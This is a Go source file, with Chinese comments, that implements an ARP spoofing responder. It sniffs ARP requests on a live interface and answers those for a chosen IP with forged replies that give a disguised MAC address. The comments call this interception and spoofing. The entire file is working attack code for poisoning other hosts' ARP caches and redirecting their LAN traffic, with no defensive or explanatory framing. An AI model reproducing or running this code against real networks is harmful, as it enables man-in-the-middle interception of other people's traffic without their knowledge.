package arp

import (
	"fmt"
	"net"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/mdlayher/arp"
)

type ArpHandler struct {
	handler      *pcap.Handle
	hookIP       net.IP
	DisguisedMac net.HardwareAddr
}

// 抓到请求hookIP地址的arp请求 把disguisedMac的值伪装成结果响应回去
func NewArpHandler(ifaceName string, hookIP net.IP, disguisedMac net.HardwareAddr) (*ArpHandler, error) {
	h, err := pcap.OpenLive(ifaceName, 1600, true, pcap.BlockForever)
	if err != nil {
		return nil, err
	}
	if err := h.SetBPFFilter("arp"); err != nil {
		return nil, err
	}
	return &ArpHandler{
		handler:      h,
		hookIP:       hookIP,
		DisguisedMac: disguisedMac,
	}, nil
}

func (a *ArpHandler) Close() {
	a.handler.Close()
}

func (a *ArpHandler) watch() {
	fmt.Println("ArpHandler watch")
	packetSource := gopacket.NewPacketSource(a.handler, a.handler.LinkType())
	for packet := range packetSource.Packets() {
		arpLayer := packet.Layer(layers.LayerTypeARP)
		if arpLayer != nil {
			arps, _ := arpLayer.(*layers.ARP)
			if arps.Operation == uint16(arp.OperationRequest) {
				fmt.Println("收到arp请求")
				//go a.check(arps.DstProtAddress, arps)
				go a.CheckIfNeedReply(
					arps,
					// arps.SourceProtAddress, // 来源ip
					// arps.SourceHwAddress,   // 来源mac
					// arps.DstProtAddress,    // 要访问的ip
				)
			}
		}
	}
}

// 检测 是否要进行拦截 和 ARP欺骗
func (a *ArpHandler) CheckIfNeedReply(request *layers.ARP) error {
	if net.IP(request.DstProtAddress).To4().String() == a.hookIP.To4().String() {
		fmt.Printf("收到来自%s的arp请求，正在构建响应包 \n", net.IP(request.SourceProtAddress).To4().String())
		err := a.SendReply(request.SourceHwAddress, request.SourceProtAddress)
		if err != nil {
			fmt.Println(err)
		}
		return err
	}
	return nil
}

func (a *ArpHandler) SendReply(toMac net.HardwareAddr, toIp net.IP) error {
	ethernet := &layers.Ethernet{
		SrcMAC:       a.DisguisedMac,
		DstMAC:       toMac,
		EthernetType: layers.EthernetTypeARP,
	}

	arps := &layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPReply,
		SourceHwAddress:   ethernet.SrcMAC, // 欺诈的mac
		SourceProtAddress: a.hookIP.To4(),
		DstHwAddress:      toMac,
		DstProtAddress:    toIp,
	}

	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}
	err := gopacket.SerializeLayers(buf, opts, ethernet, arps)
	if err != nil {
		return err
	}
	err = a.handler.WritePacketData(buf.Bytes())
	time.Sleep(1 * time.Second)
	return err

}
